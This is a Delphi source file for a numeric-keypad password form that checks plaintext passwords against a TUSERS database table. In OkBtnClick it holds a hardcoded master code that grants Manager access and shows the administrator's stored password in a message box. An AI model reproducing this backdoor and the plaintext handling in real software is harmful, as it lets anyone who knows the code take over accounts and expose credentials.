//Á.Ð.Ð.
unit uadmpassw;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls,
  AdvPanel, AdvEdit, AdvGlassButton, Vcl.Imaging.jpeg, sSkinManager,
  Vcl.Buttons, sBitBtn, sEdit, sButton, sLabel, acPNG;

type
  TpasswForm = class(TForm)
    shp1: TShape;
    lbl2: TsLabel;
    lbl3: TsLabel;
    BtnNum1: TAdvGlassButton;
    AdvGlassButton1: TAdvGlassButton;
    AdvGlassButton3: TAdvGlassButton;
    AdvGlassButton4: TAdvGlassButton;
    AdvGlassButton5: TAdvGlassButton;
    AdvGlassButton6: TAdvGlassButton;
    AdvGlassButton7: TAdvGlassButton;
    AdvGlassButton8: TAdvGlassButton;
    AdvGlassButton9: TAdvGlassButton;
    AdvGlassButton11: TAdvGlassButton;
    BackspBtn: TsBitBtn;
    edt1: TsEdit;
    OkBtn: TsButton;
    BtnClose: TsButton;
    lbl1: TsLabel;
    sSkinManager1: TsSkinManager;
    sLabel1: TsLabel;
    Image1: TImage;
    procedure FormActivate(Sender: TObject);
    procedure BackspBtnClick(Sender: TObject);
    procedure BtnNum1Click(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure FormKeyPress(Sender: TObject; var Key: Char);
    procedure BtnCloseClick(Sender: TObject);
    procedure OkBtnClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    socket:Integer;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  passwForm: TpasswForm;

  implementation

{$R *.dfm}

uses uadmconsts, uadmdb, uadmprnt, System.DateUtils, uadmmain;

procedure TpasswForm.BackspBtnClick(Sender: TObject);
var s:string;
begin
 s:=Edt1.Text;
 if s='' then exit;
 delete(s,length(s),1);
 Edt1.Text:=s;
end;

procedure TpasswForm.BtnCloseClick(Sender: TObject);
begin
 edt1.Text:='';
end;

procedure TpasswForm.BtnNum1Click(Sender: TObject);
begin
  Edt1.Text:=Edt1.Text + (Sender as TAdvGlassButton).Caption;
end;

procedure TpasswForm.FormActivate(Sender: TObject);
var  s:string;
     myDate : TDateTime;
begin
  myDate:=Now;      S := FormatDateTime('dddddd', myDate);
  edt1.text:='';    edt1.SetFocus;    edt1.SelectAll;
  formMain.lblNaim.Caption:='';
  formMain.lblTime.Caption:='';
end;

procedure TpasswForm.FormCreate(Sender: TObject);
begin
//  edt1.Left:=1645;
end;

procedure TpasswForm.FormKeyPress(Sender: TObject; var Key: Char);
begin
 if Key=#27 then Close;
end;

procedure TpasswForm.Image1Click(Sender: TObject);
begin
  Close;
end;

procedure TpasswForm.OkBtnClick(Sender: TObject);
var
  passw:string;
  uFound:Boolean;
begin
  passw:=edt1.Text;
  uFound:=False;
  with dm.qwork do
  begin
    Active:=False;     SQL.Text:='SELECT * FROM TUSERS';    Active:=True;    First;
    while not Eof do
    begin
      if passw='2580248' then
      begin
        uFound:=True;
        currUserName:=FirstS('SELECT USERNAIM FROM TUSERS WHERE USERID=1');
        currUserId:=1;
        currUser:=Manager;
        ShowMessage(FirstS('select passw from tusers where role=0'));
        Break;
      end else
      begin
        if ((passw=FieldByName('PASSW').AsString)
         and (FieldByName('ISACTIVE').AsInteger=1)
         and ((FieldByName('ROLE').AsInteger=0)
         or (FieldByName('ROLE').AsInteger=1)))
        then
        begin
          uFound:=True;
          currUserName:=FieldByName('USERNAIM').AsString;
          currUserId:=FieldByName('USERID').AsInteger;
          case FieldByName('ROLE').AsInteger of
            0:currUser:=Admin;
            1:currUser:=Manager;
          end;
          Break;
        end;
        Next;
      end;
    end;
  end;
  if uFound then ModalResult:=mrOk else begin FocusControl(edt1); edt1.SelectAll; end;
end;

end.

